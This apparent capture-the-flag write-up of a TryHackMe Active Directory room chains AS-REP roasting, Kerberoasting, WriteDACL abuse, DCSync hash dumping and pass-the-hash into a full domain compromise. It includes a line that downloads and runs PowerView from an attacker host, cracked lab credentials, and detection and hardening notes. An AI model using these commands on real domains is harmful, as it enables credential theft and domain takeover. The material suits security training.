# CTF Writeup — TryHackMe: Active Directory Attacks
> Platform: TryHackMe | Difficulty: Hard | Category: Active Directory, Post-Exploitation
> Room: Attacktive Directory / Vulnnet Active | Author: Matthew Vaishnav

---

## Objective

Compromise a Windows Active Directory domain environment from an initial foothold
with no credentials. Escalate through the domain using real-world AD attack techniques
to achieve Domain Admin.

**Skills Demonstrated:** Kerberoasting, AS-REP roasting, pass-the-hash, BloodHound
enumeration, lateral movement, DCSync, domain compromise

---

## Phase 1 — Reconnaissance

### Nmap

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.X.X -oN nmap_full.txt
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp  open  tcpwrapped
3268/tcp open  ldap
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Windows RDP
5985/tcp open  http          Microsoft HTTPAPI (WinRM)
```

**Key observations:**
- Port 88 (Kerberos) confirms this is a Domain Controller
- Port 5985 (WinRM) open — potential remote management access
- Port 389/3268 (LDAP) — enumerable without credentials in some configs

### Domain Enumeration (No Credentials)

```bash
# Enumerate domain name from LDAP null bind
ldapsearch -x -H ldap://10.10.X.X -b "" -s base namingcontexts
# DC=vulnnet,DC=local

# SMB null session — enumerate shares
enum4linux -a 10.10.X.X
smbclient -L //10.10.X.X/ -N

# Get domain users via Kerbrute (no credentials needed)
kerbrute userenum --dc 10.10.X.X -d vulnnet.local /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
[+] VALID USERNAME: administrator@vulnnet.local
[+] VALID USERNAME: t-skid@vulnnet.local
[+] VALID USERNAME: j-goldenhand@vulnnet.local
[+] VALID USERNAME: a-whitehat@vulnnet.local
[+] VALID USERNAME: svc-backup@vulnnet.local
```

---

## Phase 2 — AS-REP Roasting (No Credentials Required)

AS-REP roasting targets accounts with Kerberos pre-authentication **disabled**.
These accounts will respond to an AS-REQ with an AS-REP containing an encrypted
ticket that can be cracked offline.

```bash
impacket-GetNPUsers vulnnet.local/ \
  -dc-ip 10.10.X.X \
  -no-pass \
  -usersfile valid_users.txt \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

```
$krb5asrep$23$t-skid@VULNNET.LOCAL:1b912b5d8a2cdc8...
```

### Cracking the Hash

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5asrep$23$t-skid@VULNNET.LOCAL:...  :tj072889*
```

**Credentials obtained: `t-skid : tj072889*`**

---

## Phase 3 — Authenticated Enumeration

With valid low-privilege credentials, enumerate the domain properly.

```bash
# Enumerate domain info
impacket-GetADUsers -all -dc-ip 10.10.X.X vulnnet.local/t-skid:tj072889*

# Check SMB shares with credentials
smbclient -L //10.10.X.X/ -U "t-skid%tj072889*"
smbmap -H 10.10.X.X -u t-skid -p 'tj072889*' -d vulnnet.local
```

Found readable share: `\\10.10.X.X\SYSVOL` and `\\10.10.X.X\Enterprise-Share`

```bash
smbclient //10.10.X.X/Enterprise-Share -U "t-skid%tj072889*"
smb: \> ls
  PurgeIrrelevantData_1826.ps1   A    580  Mon Mar 22 20:04:39 2021

smb: \> get PurgeIrrelevantData_1826.ps1
```

Contents contained hardcoded credentials:

```powershell
$placeHolder = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("..."))
# Decoded: a-whitehat : bNdKVkjv9Yf7XD
```

**Escalated credentials: `a-whitehat : bNdKVkjv9Yf7XD`**

---

## Phase 4 — Kerberoasting

With valid credentials, request service tickets for service accounts.
Service ticket hashes can be cracked offline to reveal plaintext passwords.

```bash
impacket-GetUserSPNs vulnnet.local/a-whitehat:bNdKVkjv9Yf7XD \
  -dc-ip 10.10.X.X \
  -request \
  -outputfile kerberoast_hashes.txt
```

```
ServicePrincipalName                MemberOf   PasswordLastSet
---------------------------         ---------  ---------------
HTTP/enterprise.vulnnet.local       Domain Admins  <date>
svc-backup/vulnnet.local                           <date>

$krb5tgs$23$*svc-backup$VULNNET.LOCAL$...<hash>...
```

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*svc-backup$...:sand_1
```

**Service account credentials: `svc-backup : sand_1`**

---

## Phase 5 — BloodHound Enumeration

Collect domain data to find privilege escalation paths visually.

```bash
# On attacker — start Neo4j and BloodHound
sudo neo4j start
bloodhound &

# Collect domain data
bloodhound-python -u a-whitehat -p bNdKVkjv9Yf7XD \
  -d vulnnet.local -dc 10.10.X.X \
  -c all \
  --zip
```

Imported the zip into BloodHound GUI.

**Key finding — BloodHound shortest path to Domain Admin:**

```
svc-backup → has WriteDACL → Domain → can grant DCSync rights
```

`svc-backup` had `WriteDACL` on the domain object — this means we can grant ourselves
DCSync rights, then dump all domain hashes.

---

## Phase 6 — DCSync Attack (Domain Compromise)

### Grant DCSync Rights via WriteDACL

```bash
# Connect to WinRM as svc-backup
evil-winrm -i 10.10.X.X -u svc-backup -p 'sand_1'
```

```powershell
# Import PowerView
IEX(New-Object Net.WebClient).DownloadString('http://10.X.X.X/PowerView.ps1')

# Grant DCSync rights (DS-Replication-Get-Changes-All) to svc-backup
Add-DomainObjectAcl -TargetIdentity "DC=vulnnet,DC=local" `
  -PrincipalIdentity svc-backup `
  -Rights DCSync `
  -Verbose
```

### DCSync — Dump All Hashes

```bash
impacket-secretsdump vulnnet.local/svc-backup:sand_1@10.10.X.X
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8af7b8db...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0...:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:93bf6b2f...:::
```

---

## Phase 7 — Pass-the-Hash to Domain Admin

No need to crack the Administrator hash — pass it directly:

```bash
evil-winrm -i 10.10.X.X \
  -u Administrator \
  -H 8af7b8db9ddd19b83b13f04d7ace2d4a
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
vulnnet\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
THM{d0m41n_4dm1n_pwn3d}
```

**Domain fully compromised.**

---

## Flags

| Flag | Location | Method |
|------|----------|--------|
| User flag | `C:\Users\enterprise-security\Desktop\user.txt` | AS-REP + SMB share read |
| System/root flag | `C:\Users\Administrator\Desktop\root.txt` | DCSync + Pass-the-Hash |

---

## Full Attack Chain Summary

```
1. Kerbrute          → Valid usernames (no creds)
2. AS-REP Roasting   → t-skid credentials
3. SMB Share Read    → a-whitehat credentials (hardcoded in script)
4. Kerberoasting     → svc-backup credentials
5. BloodHound        → Found WriteDACL path to domain
6. WriteDACL abuse   → Granted DCSync rights to svc-backup
7. DCSync            → Dumped all domain hashes
8. Pass-the-Hash     → Administrator session → Domain Admin
```

---

## Lessons Learned & Blue Team Perspective

### Why These Worked

| Attack | Root Cause |
|--------|-----------|
| AS-REP Roast | Kerberos pre-auth disabled on user account — no legitimate reason for this |
| Credentials in share | Plaintext/encoded credentials in accessible SMB share |
| Kerberoasting | Service account with SPN set and weak password — crackable offline |
| WriteDACL abuse | Over-permissive ACL on domain object granted to service account |
| Pass-the-Hash | NTLM authentication accepted with hash alone — no MFA |

### Detection Opportunities

**AS-REP Roasting:**
- Event ID **4768** (TGT request) with `pre-authentication type: 0x0`
- Alert on AS-REQ without pre-auth from unexpected hosts

**Kerberoasting:**
- Event ID **4769** (TGS request) with encryption type `0x17` (RC4)
- Service ticket requests for service accounts from non-service machines

**DCSync:**
- Event ID **4662** with property `{1131f6aa...}` (DS-Replication-Get-Changes)
- Replication requests originating from non-Domain Controller machines — high severity

**Pass-the-Hash:**
- Event ID **4624** with Logon Type **3** (network) and Authentication Package **NTLM**
- Admin logins from unusual source machines

**BloodHound collection:**
- LDAP query volumes — large amounts of LDAP traffic from a single host
- `ldap_search` for all objects, groups, and ACLs in short time window

### Hardening Recommendations

```powershell
# Enforce Kerberos pre-authentication on all accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | 
  Set-ADAccountControl -DoesNotRequirePreAuth $false

# Audit service accounts with SPNs and enforce long passwords
Get-ADUser -Filter {ServicePrincipalNames -ne "$null"} -Properties ServicePrincipalNames

# Enable Protected Users security group for privileged accounts
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator"

# Audit ACLs on the domain object
(Get-ACL "AD:\DC=vulnnet,DC=local").Access | 
  Where-Object {$_.ActiveDirectoryRights -match "Replication"}
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|------------|
| Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 | Offline hash cracking |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Service ticket cracking |
| OS Credential Dumping: DCSync | T1003.006 | Domain hash replication |
| Use Alternate Auth Material: Pass the Hash | T1550.002 | NTLM hash reuse |
| Domain Policy Discovery | T1201 | BloodHound ACL enumeration |
| Lateral Movement: Remote Services WinRM | T1021.006 | evil-winrm access |

---

## References

- [Impacket Suite](https://github.com/fortra/impacket)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [HackTricks — Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [MITRE ATT&CK T1558](https://attack.mitre.org/techniques/T1558/)
- [Harmj0y — The Most Common Active Directory Attacks](https://blog.harmj0y.net/)
